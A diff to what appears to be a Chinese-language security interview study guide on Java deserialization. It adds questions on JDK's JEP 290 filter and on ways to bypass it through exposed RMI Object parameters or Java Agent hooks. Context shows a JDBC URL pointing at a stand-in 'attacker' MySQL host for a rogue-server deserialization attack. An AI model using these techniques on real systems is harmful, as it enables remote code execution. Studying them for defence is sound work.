@@ -239,3 +239,19 @@ jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.Server
 ```
 
 以上是基本攻击手段，还有一些进阶的内容，例如`allowUrlInLocalInfile`和`detectCustomCollations`参数
+
+
+
+### 你知道JDK针对反序列化漏洞做了什么修复嘛（★★★）
+
+在`JEP 290`中提供一个限制反序列化的类的机制，黑白名单方式，同时限制反序列化深度和复杂度，为 RMI 导出的对象设置了验证机制。具体实现是提供一个全局过滤器，可以从属性或者配置文件中配置。在`ObjectInputStream`类中增加了一个`serialFilter`属性和一个`filterChcek`函数，其中`serialFilter`就可以理解为过滤器
+
+
+
+### JEP 290有没有绕过的办法（★★★★★）
+
+根据`JEP 290`限制的原理，白名单对象包括了：String,Remote,Proxy,UnicaseRef,RMIClientSocketFactory等
+
+如果目标的`RMI`服务暴漏了`Object`参数类型的方法，且该类在白名单中，我们就可以注入Payload进去以绕过检测
+
+另外还一些骚思路，比如想办法改源码，或用`Java Agent`对某些方法`Hook`并更改等
